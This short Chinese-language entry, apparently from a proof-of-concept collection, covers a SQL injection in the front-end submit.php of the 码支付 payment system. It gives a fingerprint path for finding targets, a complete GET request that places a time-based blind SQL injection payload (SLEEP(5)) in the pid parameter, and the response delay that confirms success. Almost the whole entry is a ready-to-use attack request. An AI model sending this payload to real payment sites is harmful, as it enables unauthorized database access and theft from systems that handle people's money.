# 码⽀付存在前台submit.php存在SQL注⼊漏洞

码⽀付 ｜ 其他 ｜ —
- **指纹**：`"/epaydoc/epaydoc.php"`
- **请求**：`GET /submit.php?pid='+AND+(SELECT+1537+FROM+(SELECT(SLEEP(5)))VpjZ)--+CSLx`

**Payload**
```
HTTP/1.1
Host: 192.168.64.128:81
```
- **响应特征**：200 响应时间>=5s